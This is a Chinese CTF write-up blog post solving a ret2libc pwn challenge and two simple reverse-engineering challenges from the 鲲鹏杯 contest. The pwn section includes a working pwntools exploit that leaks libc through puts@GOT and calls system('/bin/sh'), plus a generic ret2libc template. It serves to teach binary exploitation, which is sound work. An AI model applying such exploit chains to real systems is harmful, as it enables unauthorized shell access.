---
title: "鲲鹏杯比赛 WP 汇总"
description: "鲲鹏杯 PWN 题 easy_ret2libc 与 Reverse 题 XOR Once、Hello Stgrings 的完整 WP。"
date: 2026-11-13T10:00:00+08:00
slug: "kunpeng-cup-wp"
image: ""
math: true
categories:
    - CTF WP
tags:
    - "鲲鹏杯"
    - "CTF"
    - "PWN"
    - "Reverse"
---

## pwn

### easy_ret2libc

64位文件，通过查看保护机制，NO PIE，NX，无Canary，Partial RELRO，提示给出

```text
easy_ret2libc —— PWN 签到题
连接: nc <比赛平台公布的地址> <端口>
连接后先完成人机验证(看图输答案, 90 秒内,最多 3 次),
服务会下发"你的专属实例"二进制(偏移/地址每次不同),
需要在同一条连接上完成利用。
附件:
chall 样例二进制(线上实例以同一模板随机生成)
libc.so.6 glibc 2.35 (与线上运行环境逐字节一致)
ld-linux-x86-64.so.2 配套动态链接器
client_helper.py 连接助手(仅 Python 标准库, 三系统通用)
python3 client_helper.py <host> <port>
本地调试:
./ld-linux-x86-64.so.2 --library-path ../chall
(或 patchelf --set-interpreter./ld-linux-x86-64.so.2 ./chall)
提示: checksec 可见 No PIE / No canary /NX; 二进制里有 gift 函数。
祝你玩得开心!
```

这里特意点明了gift函数，一开始不知何意味。。

![image-20261107143254372](https://cdn.jsdelivr.net/gh/3133q/blog-pictures@main/image-20261107143254372.png)

这也看不出。。

看看主逻辑

![image-20261107143324055](https://cdn.jsdelivr.net/gh/3133q/blog-pictures@main/image-20261107143324055.png)

本质就是read的一个栈溢出，利用一下，然后直接打个libc

注意，如果按照正规的模板，先通过puts把libc里面的puts真实地址打印出来，然后通过这个计算偏移，然后返回vuln再来一轮，计算基址，system，binsh，最后getshell

但这题很怪，被提示给坑了qoq

说是nc 靶机之后出现一个验证码去识别，然后给二进制，一开始我不断尝试这个东西，不论是单纯nc端口，还是直接脚本打远端，亦或是用给的client.py

```python
#!/usr/bin/env python3
"""跨平台连接助手(仅 Python 标准库, Windows/macOS/Linux 通用, 无需 pwntools)。

用法:
  python3 tools/client_helper.py [host] [port]     # 交互: 查看验证码输答案
流程: (PoW 自动计算) -> 验证码就地显示/系统看图器打开 -> 人工作答
      -> 实例二进制自动保存为 my_instance -> 进入交互(可直接 cat /flag)
也可作为模块: from client_helper import connect  # 返回 Tube
"""
import base64
import hashlib
import os
import socket
import subprocess
import sys
import threading


def log(msg):
    print(msg, flush=True)


class Tube:
    """极简 socket 封装: 行/定长/界符读取 + 交互模式。"""

    def __init__(self, host, port):
        self.s = socket.create_connection((host, int(port)), timeout=20)
        self.s.settimeout(None)
        self.buf = b''

    def _fill(self, timeout=120):
        self.s.settimeout(timeout)
        d = self.s.recv(65536)
        if not d:
            raise EOFError('connection closed')
        self.buf += d

    def recvuntil(self, marker, timeout=120):
        while marker not in self.buf:
            self._fill(timeout)
        i = self.buf.index(marker) + len(marker)
        out, self.buf = self.buf[:i], self.buf[i:]
        return out

    def recvline(self, timeout=120):
        return self.recvuntil(b'\n', timeout)

    def recvn(self, n, timeout=120):
        while len(self.buf) < n:
            self._fill(timeout)
        out, self.buf = self.buf[:n], self.buf[n:]
        return out

    def sendline(self, data=b''):
        self.send(data + b'\n')

    def send(self, data):
        self.s.sendall(data)

    def interactive(self):
        def pump():
            try:
                while True:
                    d = self.s.recv(65536)
                    if not d:
                        break
                    sys.stdout.buffer.write(d)
                    sys.stdout.buffer.flush()
            except Exception:
                pass
        threading.Thread(target=pump, daemon=True).start()
        try:
            while True:
                line = sys.stdin.buffer.readline()
                if not line:
                    break
                self.send(line)
        except Exception:
            pass

    def close(self):
        try:
            self.s.close()
        except Exception:
            pass


def show_captcha(path):
    """尽量就地显示验证码: 支持内嵌图片的终端直接内联渲染,
    否则尝试调用系统看图器打开; 都失败则提示手动打开。"""
    data = open(path, 'rb').read()
    term = os.environ.get('TERM_PROGRAM', '')
    try:
        if term in ('iTerm.app', 'WezTerm'):  # iTerm2 内嵌图片协议
            name = base64.b64encode(path.encode()).decode()
            b64 = base64.b64encode(data).decode()
            sys.stdout.write(f'\033]1337;File=name={name};inline=1;size={len(data)}:{b64}\a\n\n')
            sys.stdout.flush()
            return
        if os.environ.get('KITTY_WINDOW_ID'):  # kitty
            subprocess.run(['kitten', 'icat', path], check=True)
            return
    except Exception:
        pass
    opener = {'darwin': 'open', 'win32': None}.get(sys.platform, 'xdg-open')
    try:
        if opener is None:                     # Windows 原生 Python
            os.startfile(path)
        else:
            subprocess.Popen([opener, path],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        log(f'[!] 验证码已用系统看图器打开: {path}')
    except Exception:
        log(f'[!] 请手动打开验证码图片: {path}')
    log('[i] 也可直接看连接输出里的字符画预览(ANSI/纯 ASCII 两档)')


def solve_pow(line):
    # line 例: POW find X: sha256("SALT"+X) hex starts with 4 "0". send X
    salt = line.split(b'sha256("')[1].split(b'"')[0].decode()
    bits = int(line.split(b'starts with ')[1].split(b' ')[0])
    prefix = '0' * bits
    i = 0
    while True:
        x = base64.b16encode(i.to_bytes(8, 'little')).decode().lower()
        if hashlib.sha256((salt + x).encode()).hexdigest().startswith(prefix):
            return x.encode()
        i += 1


def connect(host='127.0.0.1', port=9999,
            captcha_image='captcha.png', instance_file='my_instance'):
    io = Tube(host, port)

    # PoW(若开启): 自动计算
    first = io.recvline(10)
    if first.startswith(b'POW'):
        log('[*] solving PoW...')
        io.sendline(solve_pow(first))
    else:
        io.buf = first + io.buf

    # 视觉验证码: 保存图片, 就地显示, 人工作答
    while True:
        line = io.recvline(120)
        if line.startswith(b'CAPTCHA png'):
            n = int(line.split()[2])
            open(captcha_image, 'wb').write(io.recvn(n))
            show_captcha(captcha_image)
            io.recvuntil(b'your answer:')   # 吞掉字符画/base64 预览段
            io.sendline(input('answer> ').encode())
        elif line.startswith(b'WRONG'):
            log('[!]' + line.decode().strip())  # 随后服务端会重新出题
        elif line.startswith(b'INSTANCE'):
            blob = io.recvn(int(line.split()[1]))
            open(instance_file, 'wb').write(blob)
            log(f'[+] 实例已保存: {instance_file} ({len(blob)} bytes)')
            io.recvline(10)
            break
        else:
            log('[i]' + line.decode(errors='replace'))
    return io


if __name__ == '__main__':
    host = sys.argv[1] if len(sys.argv) > 1 else '127.0.0.1'
    port = sys.argv[2] if len(sys.argv) > 2 else '9999'
    io = connect(host, port)
    log('[+] 已接入题目实例, 进入交互 (提示: cat /flag)')
    io.interactive()

```

全部不行，无语。。。

最后还是经典打败魔法，最朴素的libc即可打通，解题

直接看脚本吧

#### 脚本

```python
from pwn import *

context(arch='amd64', os='linux', log_level='info')

exe = ELF('./chall', checksec=False)
pop_rdi_ret=0x40117e
ret=0x40101a
libc = ELF('./libc.so.6', checksec=False)
#io = remote(sys.argv[1], int(sys.argv[2]))
io = process(['./ld-linux-x86-64.so.2', '--library-path', '.', './chall'])

io.recvuntil(b'Leave your name: ')

#io.send(flat(b'A' * 40, exe.sym['gift'] + 8, exe.got['puts'], exe.plt['puts'], exe.sym['vuln']))

io.send(flat(b'A' * 40, pop_rdi_ret , exe.got['puts'], exe.plt['puts'], exe.sym['vuln']))

io.recvuntil(b'Nice to meet you!\n')
libc.address = u64(io.recvn(6).ljust(8, b'\x00')) - libc.sym['puts']
log.success('libc base = %#x', libc.address)

io.recvuntil(b'Leave your name: ')
io.send(flat(b'A' * 40, pop_rdi_ret , next(libc.search(b'/bin/sh')), ret , libc.sym['system']))
sleep(1)

io.interactive()
#io.sendline(b'cat /flag; id')
#print(io.recvrepeat(2).decode(errors='replace'))
```

对于64位，直接用ROPgadget --binary chall | grep "pop rdi"找个地址即可，当然，看IDA也能看出来gift函数存在rdi，故都行

第一段泄露地址，第二段直接写binsh进去，系统调用，getshell！

**拓展：**

| 符号 / 写法                  | 名字与全称                            | 它是什么？                                      | 特性                                                         |
| :--------------------------- | :------------------------------------ | :---------------------------------------------- | :----------------------------------------------------------- |
| `sym["puts"]` (或 `symbols`) | Symbol（符号地址）                    | 对应函数在当前程序静态视角下的地址。            | 如果没有开启 PIE（地址随机化），它是一个固定的相对/绝对地址。 |
| `plt["puts"]`                | Procedure Linkage Table（程序链接表） | 一段代码片段（Stub），存放在代码段（`.text`）。 | 每次你调用 `puts()` 时，程序跳到这里。它的地址通常是固定的（没开 PIE 时）。 |
| `got["puts"]`                | Global Offset Table（全局偏移表）     | 一个指针/变量，存放在可读写的 `.got.plt` 段中。 | 里面装着 `puts` 函数在动态库（`libc`）里的真实运行时内存地址。 |

| 写法              | 类型           | 你拿它干什么                              |
| ----------------- | -------------- | ----------------------------------------- |
| `exe.sym['gift']` | 代码地址       | 跳过去执行                                |
| `exe.plt['puts']` | 代码地址（桩） | 当作“调用 puts”使用                       |
| `exe.got['puts']` | **数据地址**   | 作为**参数**传给 puts，让它打印里面的内容 |

因为程序是动态链接，编译时并不知道libc.so最终会被加载到内存的哪个随机地址ASLR，所以不能直接填puts内存地址，程序编译后，所有对puts的调用都会去重定向调用puts@plt，`puts@plt` 这段代码会去看 puts@got里面存的是什么：

第一次调用前（延迟绑定 / Lazy Binding）：GOT 表里存的其实是 PLT 自己的“回马枪”地址，它会触发动态链接器（`ld.so`）去 `libc` 里把 `puts` 的真实内存地址找出来，并写入到 `puts@got` 中。之后的所有调用：PLT 直接读取 GOT 里的真实地址，一溜烟跳转过去执行真正的 `puts`。

#### 大致思路

#### 1. 泄露真实地址（Leak）

因为 `puts` 的功能是“打印字符串直到遇到 `\0` 为止”，如果我们通过栈溢出精心控制程序的执行流：

- 把参数（寄存器或栈顶）指向 **`elf.got["puts"]`**（即 `puts` 在内存中的真实指针）。
- 然后跳转到 **`elf.plt["puts"]`** 去执行。

**奇迹发生了**：`puts` 误以为你要打印一个字符串，结果它去读了 `puts@got` 里面的内容——也就是 `puts` 在 `libc` 里的**真实运行时地址**，并把它打印到了你的屏幕上！

#### 2. 计算 Libc 基址

通过脚本捕获到这几个字节后，你可以用公式算出当前的 `libc` 基址：

$$\text{Libc Base} = \text{Leaked Puts Address} - \text{Libc 中的 Puts 偏移量}$$

#### 3. 二次利用（Get Shell）

一旦知道了 `libc` 的基址，整个 `libc` 里的函数（如 `system`）和字符串（如 `"/bin/sh"`）的真实地址就全部透明了。此时你可以再次让程序崩溃重启（或者跳回 `main` 函数），发起第二次攻击，直接调用 `system("/bin/sh")` 拿到权限。

### 四、 常见脚本伪代码模板

在 pwntools 中，标准利用模板长这样：

```python
from pwn import *

p = process('./vulnerable_binary')
elf = ELF('./vulnerable_binary')
libc = ELF('./libc.so.6')

# 1. 构造 Payload 泄露 puts 的真实地址
# (假设 32 位或 64 位通过寄存器/栈传参，这里以调用 puts(elf.got['puts']) 为例)
payload = b'A' * offset
payload += p32(elf.plt['puts'])      # 调用 puts 的 PLT
payload += p32(elf.sym['main'])      # 打印完后让程序跳回 main 函数（方便二次利用）
payload += p32(elf.got['puts'])      # 把 puts 的 GOT 表项作为参数传进去！

p.sendline(payload)

# 2. 接收打印出来的真实地址
leaked_puts = u32(p.recv(4))         # 32位接收4字节
libc.address = leaked_puts - libc.sym['puts'] # 计算出 libc 的实际加载基址
print(hex(libc.address))

# 3. 拿到 shell
# 接下来利用计算出的 libc.sym['system'] 和 libc.search('/bin/sh') 再次 getshell
```



---

## reverse

### XOR Once

运行一下xor.exe

```python
Every input byte is XORed with the same key: 0x0f.
```

小提示，每一个输入的字符都会异或上0x0f

反汇编看看

![image-20261107163921293](https://cdn.jsdelivr.net/gh/3133q/blog-pictures@main/image-20261107163921293.png)

分析这个，很容易看出，就是fgets先读入Buffer，然后去掉末尾的\r或\n，随后进行长度检验，限制了28位，然后从0-27一个个遍历，去异或比对

```C
((unsigned __int8)Buffer[i] ^ 0xF) != aNzLITwPfPJyJfM[i]
```

含义在于，用户输入的第i个字符与0x0f进行异或运算后，必须等于全局数据段中的密文数组aNzLITwPfPJyJfM的第i个字节，如果28个字节都匹配成功，则输出Correct

![image-20261107165519335](https://cdn.jsdelivr.net/gh/3133q/blog-pictures@main/image-20261107165519335.png)

直接shift+E，去吧数组里的字节都打印出来

```python
data=bytes.fromhex("4E5A5C5B4C5B492F2F7477607D50667C507D6A796A7D7C666D636A72")
print(bytes(b^0x0f for b in data).decode())
```

注意要把0x都去掉，随后运行即可

---

### Hello Stgrings

直接反汇编即可

也可以看看提示：

![image-20261107171227408](https://cdn.jsdelivr.net/gh/3133q/blog-pictures@main/image-20261107171227408.png)

因为这个是动态地址，在IDA里边解析的是静态地址，也称Image Base或虚拟地址VA

静态地址：

- 定义：它是程序在没有运行、静止状态下，由编译器和链接器在编译时排布好的虚拟地址。
- 特点：对于 64 位程序，常见的起始地址通常是 `0x140000000`（就像你刚才截图中看到的 `sub_140001450`）。只要这个文件的版本没变，无论你在什么电脑上用 IDA 打开，它里面的函数、全局变量、字符串的地址都是固定不变的。

| **维度**     | **静态地址（IDA 中看到的）**                | **动态地址（程序运行时的内存地址）**                      |
| ------------ | ------------------------------------------- | --------------------------------------------------------- |
| **状态**     | 文件写死在磁盘里的虚拟地址                  | 进程被操作系统加载到内存中的实际地址                      |
| **是否会变** | 不会变（固定基址 + RVA）                    | 可能会变（取决于是否开启了 PIE / ASLR）                   |
| **如何计算** | 直接读 IDA 里的十六进制（如 `0x140001450`） | 实际运行地址 = 内存加载基址 (Image Base) + RVA (相对偏移) |

或者直接找也行--

![image-20261107171552137](https://cdn.jsdelivr.net/gh/3133q/blog-pictures@main/image-20261107171552137.png)

成功拿到！！

---

*若文中有理解不深、表述欠妥之处，欢迎各路师傅指正交流。*
